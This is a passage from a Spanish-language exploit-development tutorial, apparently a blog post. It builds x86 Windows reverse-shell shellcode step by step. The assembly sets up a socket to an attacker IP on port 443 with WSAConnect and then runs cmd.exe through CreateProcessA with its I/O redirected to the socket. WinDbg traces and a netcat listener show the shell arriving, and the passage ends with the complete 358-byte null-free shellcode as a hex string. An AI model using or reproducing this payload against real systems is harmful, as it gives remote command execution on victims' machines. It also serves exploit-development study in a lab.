<br>• <code class="language-plaintext highlighter-rouge">lpSQOS</code>: requiere un puntero a la estructura FLOWSPEC que se utiliza en aplicaciones que soportan parametros QoS, como no es el caso vale null (<code class="language-plaintext highlighter-rouge">0</code>)
<br>• <code class="language-plaintext highlighter-rouge">lpGQOS</code>: esta reservado, simplemente se establece en null (<code class="language-plaintext highlighter-rouge">0</code>)</p>

<p class="plain-text">Para la estructura <code class="language-plaintext highlighter-rouge">sockaddr_in</code> necesitamos convertir la dirección ip del kali (<code class="language-plaintext highlighter-rouge">192.168.233.128</code>) al formato correcto igual que el puerto (<code class="language-plaintext highlighter-rouge">443</code>)</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? 0n192  
Evaluate expression: 192 = 000000c0

</span><span class="ro">0:000> </span><span class="p">? 0n168  
Evaluate expression: 168 = 000000a8

</span><span class="ro">0:000> </span><span class="p">? 0n233  
Evaluate expression: 233 = 000000e9

</span><span class="ro">0:000> </span><span class="p">? 0n128  
Evaluate expression: 128 = 00000080

</span><span class="ro">0:000> </span><span class="p">? 0n443  
Evaluate expression: 443 = 000001bb</span>
</code></pre></div></div><br>

<p class="plain-text">La funcion comienza guardando el descriptor en <code class="language-plaintext highlighter-rouge">esi</code>, despues configura la estructura <code class="language-plaintext highlighter-rouge">sockin_addr</code>, empujamos <code class="language-plaintext highlighter-rouge">0x0</code> a la pila 2 veces para el valor de <code class="language-plaintext highlighter-rouge">sin_zero[]</code>, luego empujamos el dword con la <code class="language-plaintext highlighter-rouge">ip</code> de kali, luego movemos a <code class="language-plaintext highlighter-rouge">eax</code> el puerto <code class="language-plaintext highlighter-rouge">443</code> y usando <code class="language-plaintext highlighter-rouge">shl</code> desplazamos el valor a la izquierda <code class="language-plaintext highlighter-rouge">0x10</code> bytes y añadiremos <code class="language-plaintext highlighter-rouge">0x2</code> al registro <code class="language-plaintext highlighter-rouge">ax</code>, esto porque ambos miembros <code class="language-plaintext highlighter-rouge">sin_port</code> y <code class="language-plaintext highlighter-rouge">sin_family</code> estan definidos con <code class="language-plaintext highlighter-rouge">2</code> bytes de longitud, luego guardamos en <code class="language-plaintext highlighter-rouge">edi</code> el puntero a la estructura</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">call_wsaconnect</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; socket descriptor
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; sin_zero[]
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; sin_zero[]
        </span><span class="o">push </span><span class="mi">0x80e9a8c0             </span><span class="c1">; "192.168.233.128"
        </span><span class="o">mov </span><span class="mi">ax</span><span class="p">,</span><span class="mi"> 0xbb01              </span><span class="c1">; 443
        </span><span class="o">shl </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x10               </span><span class="c1">; shift eax
        </span><span class="o">add </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x2                 </span><span class="c1">; add 0x2
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; sin_port & sin_family  
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">esp                </span><span class="c1">; $edi = sockaddr_in</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente empujamos al stack todos los argumentos y llamamos a la función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">        xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpGQOS
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpSQOS
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpCalleeData
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpCallerData
        </span><span class="o">mov </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x10                </span><span class="c1">; $eax = 0x10
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; namelen
        </span><span class="o">push </span><span class="mi">edi                    </span><span class="c1">; name
        </span><span class="o">push </span><span class="mi">esi                    </span><span class="c1">; s
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x20</span><span class="p">]           </span><span class="c1">; call WSAConnect()</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver que antes de llamar a la función podemos ver todos los argumentos y el segundo es un puntero a una estructura, veamos que pasa al llamar a <code class="language-plaintext highlighter-rouge">WSAConnect</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000010 ebx=773a0000 ecx=e5a1d462 edx=00000014 esi=0000010c edi=009ffeb8
eip=0058111e esp=009ffe9c ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x111e:
0058111e ff55e0          call    dword ptr [ebp-20h]  ss:002b:009ffef4={ws2_32!WSAConnect (773d6c80)}  

</span><span class="ro">0:000> </span><span class="p">dds esp L7
009ffe9c  0000010c
009ffea0  009ffeb8
009ffea4  00000010
009ffea8  00000000
009ffeac  00000000
009ffeb0  00000000
009ffeb4  00000000

</span><span class="ro">0:000> </span><span class="p">dds poi(esp + 4) L4
009ffeb8  bb010002
009ffebc  80e9a8c0
009ffec0  00000000
009ffec4  00000000

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=773a0000 ecx=00000000 edx=009ffbc0 esi=0000010c edi=009ffeb8
eip=00581121 esp=009ffeb8 ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x1121:
00581121 56              push    esi</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando llamamos a la función recibimos una conexión en nuestro <code class="language-plaintext highlighter-rouge">listener</code>, significa que el socket se ha creado y conectado a nuestra ip por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.233.159  </span>
</code></pre></div></div><br>

<p class="plain-text">Para llamar a <a href="https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a> nuevamente necesitaremos varios argumentos asi que probablemente necesitaremos analizar uno por uno para conocer sus valores</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">BOOL </span><span class="na">CreateProcessA</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPCSTR                </span><span class="p">lpApplicationName,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">] </span><span class="no">LPSTR                 </span><span class="p">lpCommandLine,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPSECURITY_ATTRIBUTES </span><span class="p">lpProcessAttributes,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPSECURITY_ATTRIBUTES </span><span class="p">lpThreadAttributes,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">BOOL                  </span><span class="p">bInheritHandles,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD                 </span><span class="p">dwCreationFlags,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPVOID                </span><span class="p">lpEnvironment,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPCSTR                </span><span class="p">lpCurrentDirectory,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">LPSTARTUPINFOA        </span><span class="p">lpStartupInfo,
  [</span><span class="mi">out</span><span class="p">]               </span><span class="no">LPPROCESS_INFORMATION </span><span class="p">lpProcessInformation  
);</span>
</code></pre></div></div><br>

<p class="plain-text">• <code class="language-plaintext highlighter-rouge">lpApplicationName</code>: requiere el puntero a una cadena que representa la aplicación, si el parametro es null (<code class="language-plaintext highlighter-rouge">0</code>) el parametro lpCommandLine no puede ser null (<code class="language-plaintext highlighter-rouge">0</code>)
<br>• <code class="language-plaintext highlighter-rouge">lpCommandLine</code>: espera un puntero a la cadena que contenga el comando a ejecutar, usaremos este para ejecutar una <code class="language-plaintext highlighter-rouge">cmd.exe</code>
<br>• <code class="language-plaintext highlighter-rouge">lpProcessAttributes:, lpThreadAttributes</code>: requieren punteros a estructuras SECURITY_ATTRIBYTES, para el shellcode pueden valer null (<code class="language-plaintext highlighter-rouge">0</code>)
<br>• <code class="language-plaintext highlighter-rouge">binheritHandles</code>: espera un valor booleano, determina si los handlers del proceso son heredados por el proceso (cmd.exe), este valor sera true (<code class="language-plaintext highlighter-rouge">1</code>)
<br>• <code class="language-plaintext highlighter-rouge">dwCreationFlags</code>: espera varios Process Creation Flags, si vale null (<code class="language-plaintext highlighter-rouge">0</code>) utilizara las mismas banderas que el proceso que llama
<br>• <code class="language-plaintext highlighter-rouge">lpEnviroment</code>: espera un puntero al enviroment block, si vale null (<code class="language-plaintext highlighter-rouge">0</code>) cmpartira el mismo que el proceso que llama
<br>• <code class="language-plaintext highlighter-rouge">lpCurrentDirectory</code>: permite especificar la ruta al directorio del proceso, si vale null (<code class="language-plaintext highlighter-rouge">0</code>) utilizara la misma que el proceso que llama
<br>• <code class="language-plaintext highlighter-rouge">lpStartupInfo</code>: requiere un puntero a la estructura <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code> que necesitaremos crear para ejecutar nuestro shellcode
<br>• <code class="language-plaintext highlighter-rouge">lpProcessInformation</code>: requiere un puntero a la estructura <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> pero solo necesitamos conocer el tamaño de la estructura</p>

<p class="plain-text">Para la estructura <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code> realmente solo necesitamos preocuparnos de unos pocos valores ya que el resto puede establecerse en null (<code class="language-plaintext highlighter-rouge">0</code>), el primer valor es <code class="language-plaintext highlighter-rouge">cb</code> que requiere el tamaño de la estructura que podemos calcular en windbg</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt STARTUPINFOA
MSVCR120!STARTUPINFOA
   +0x000 cb : Uint4B
   +0x004 lpReserved : Ptr32 Char
   +0x008 lpDesktop : Ptr32 Char
   +0x00c lpTitle : Ptr32 Char
   +0x010 dwX : Uint4B
   +0x014 dwY : Uint4B
   +0x018 dwXSize : Uint4B
   +0x01c dwYSize : Uint4B
   +0x020 dwXCountChars : Uint4B
   +0x024 dwYCountChars : Uint4B
   +0x028 dwFillAttribute : Uint4B
   +0x02c dwFlags : Uint4B
   +0x030 wShowWindow : Uint2B
   +0x032 cbReserved2 : Uint2B
   +0x034 lpReserved2 : Ptr32 UChar  
   +0x038 hStdInput : Ptr32 Void
   +0x03c hStdOutput : Ptr32 Void
   +0x040 hStdError : Ptr32 Void

</span><span class="ro">0:000> </span><span class="p">?? sizeof(STARTUPINFOA)
unsigned int 0x44</span>
</code></pre></div></div><br>

<p class="plain-text">El segundo valor es <code class="language-plaintext highlighter-rouge">dwFlags</code>, determina si ciertos valores de la estructura se utilizan cuando el proceso crea una ventana, necesitamos establecer este miembro a la flag <code class="language-plaintext highlighter-rouge">STARTF_USESTDHANDLES</code> (<code class="language-plaintext highlighter-rouge">0x100</code>) para habilitar los miembros <code class="language-plaintext highlighter-rouge">hStdInput</code>, <code class="language-plaintext highlighter-rouge">hStdOutput</code> y <code class="language-plaintext highlighter-rouge">hStdError</code>, tambien necesitamos establecer estos los valores, usaremos el descriptor del socket para redirigir el <code class="language-plaintext highlighter-rouge">stdin</code>, <code class="language-plaintext highlighter-rouge">stdout</code> y <code class="language-plaintext highlighter-rouge">stderr</code> al socket</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">create_startupinfoa</span><span class="p">:
        </span><span class="o">push </span><span class="mi">esi                    </span><span class="c1">; hStdError
        </span><span class="o">push </span><span class="mi">esi                    </span><span class="c1">; hStdOutput
        </span><span class="o">push </span><span class="mi">esi                    </span><span class="c1">; hStdInput
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpReserved2
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; cbReserved2 & wShowWindow  
        </span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x101               </span><span class="c1">; $eax = 0x101
        </span><span class="o">dec </span><span class="mi">eax                     </span><span class="c1">; $eax = 0x100
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwFlags
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwFillAttribute
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwYCountChars
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwXCountChars
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwYSize
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwXSize
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwY
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwX
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpTitle
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpDesktop
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpReserved
        </span><span class="o">mov </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x44                </span><span class="c1">; $eax = 0x44
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; cb
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">esp                </span><span class="c1">; $edi = startupinfoa</span>
</code></pre></div></div><br>

<p class="plain-text">Para el valor del parametro <code class="language-plaintext highlighter-rouge">lpCommandLine</code> necesitaremos crear la string del comando a ejecutar que es <code class="language-plaintext highlighter-rouge">cmd.exe</code> y guardar el puntero a esta en el registro <code class="language-plaintext highlighter-rouge">ebx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">create_string</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0xff9a879b         </span><span class="c1">; $eax = 0xff9a879b  
        </span><span class="o">neg </span><span class="mi">eax                     </span><span class="c1">; $eax = 0x00657865  
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; "exe\x00"
        </span><span class="o">push </span><span class="mi">0x2e646d63             </span><span class="c1">; "cmd."
        </span><span class="o">mov </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">esp                </span><span class="c1">; $ebx = "cmd.exe"</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez tenemos todos los argumentos podemos guardarlos en el stack y proceder a llamar a <code class="language-plaintext highlighter-rouge">CreateProcessA</code> para ejecutar la <code class="language-plaintext highlighter-rouge">cmd.exe</code> que redirigira su output al socket</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">call_createprocessa</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">esp                </span><span class="c1">; $eax = $esp
        </span><span class="o">xor </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">ecx                </span><span class="c1">; $ecx = 0x0
        </span><span class="o">mov </span><span class="mi">cx</span><span class="p">, </span><span class="mi">0x390               </span><span class="c1">; $ecx = 0x390
        </span><span class="o">sub </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ecx                </span><span class="c1">; sub cx to avoid overwriting  
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpProcessInformation
        </span><span class="o">push </span><span class="mi">edi                    </span><span class="c1">; lpStartupInfo
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpCurrentDirectory
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpEnvironment
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwCreationFlags
        </span><span class="o">inc </span><span class="mi">eax                     </span><span class="c1">; $eax = 0x1 (TRUE)
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; bInheritHandles
        </span><span class="o">dec </span><span class="mi">eax                     </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpThreadAttributes
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpProcessAttributes
        </span><span class="o">push </span><span class="mi">ebx                    </span><span class="c1">; lpCommandLine
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpApplicationName
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x14</span><span class="p">]           </span><span class="c1">; call CreateProcessA()</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar <code class="language-plaintext highlighter-rouge">CreateProcessA</code> se ejecuta una <code class="language-plaintext highlighter-rouge">cmd.exe</code> que redirige su output al socket que previamente se conecto a nuestro <code class="language-plaintext highlighter-rouge">listener</code> por lo que obtenemos una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=009ffe6c ecx=00000390 edx=009ffbc0 esi=0000010c edi=009ffe74
eip=00581166 esp=009ffe44 ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x1166:
00581166 ff55ec          call    dword ptr [ebp-14h]  ss:002b:009fff00={KERNEL32!CreateProcessAStub (76af2d70)}  

</span><span class="ro">0:000> </span><span class="p">p
ModLoad: 767d0000 76848000   C:\Windows\SysWOW64\sechost.dll
ModLoad: 77600000 77619000   C:\Windows\SysWOW64\bcrypt.dll
eax=00000001 ebx=009ffe6c ecx=14333a6f edx=00a70000 esi=0000010c edi=009ffe74
eip=00581169 esp=009ffe6c ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x1169:
00581169 31c9            xor     ecx,ecx</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.233.159
Microsoft Windows [Versión 10.0.16299.125]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Program Files\Windows Kits\10\Debuggers> </span><span class="am">whoami</span><span class="p">
windows\pc1

C:\Program Files\Windows Kits\10\Debuggers></span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado final obtenemos un <code class="language-plaintext highlighter-rouge">shellcode</code> de apenas <code class="language-plaintext highlighter-rouge">358 bytes</code> libre de null bytes y badchars comunes que nos sirve para enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>, y eliminando cosas innecesarias podemos dejar un <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/shellcode/revshell.asm">shellcode</a> de apenas <code class="language-plaintext highlighter-rouge">340 bytes</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf shellcode.asm -o shellcode.o; </span><span class="ve">ld </span><span class="p">shellcode.o -m elf_i386 -o shellcode

</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:' </span><span class="p">| </span><span class="ve">grep </span><span class="p">-v </span><span class="am">'shellcode'</span><span class="p"> | </span><span class="ve">cut</span><span class="p"> -f2 -d: | </span><span class="ve">cut </span><span class="p">-f1-6 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> | </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d</span><span class="am"> ''</span><span class="p"> -s
\x89\xe5\x83\xec\x28\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x14\x8b\x36\xad\x8b\x58\x10\xeb\x06\x5e\x89\x75\xf8\xeb\x53\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x35\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xe0\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x33\x59\xe0\x8e\xff\x55\xf8\x89\x45\xf4\x68\x6c\x43\x3c\x58\xff\x55\xf8\x89\x45\xf0\x68\xc9\x2d\xf7\xa9\xff\x55\xf8\x89\x45\xec\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\xf0\x89\xc3\x68\x10\x70\x7a\xe1\xff\x55\xf8\x89\x45\xe8\x68\xc5\x6f\xa0\xe0\xff\x55\xf8\x89\x45\xe4\x68\xa8\x6c\x96\xe0\xff\x55\xf8\x89\x45\xe0\x89\xe0\x31\xc9\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\xe8\x31\xc0\x50\x50\x50\xb0\x06\x50\xb0\x01\x50\x40\x50\xff\x55\xe4\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\xe9\x80\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x89\xe7\x31\xc0\x50\x50\x50\x50\xb0\x10\x50\x57\x56\xff\x55\xe0\x56\x56\x56\x31\xc0\x50\x50\x66\xb8\x01\x01\x48\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x89\xe7\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x89\xe3\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\xec\x99\x52\x6a\xff\xff\x55\xf4  </span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
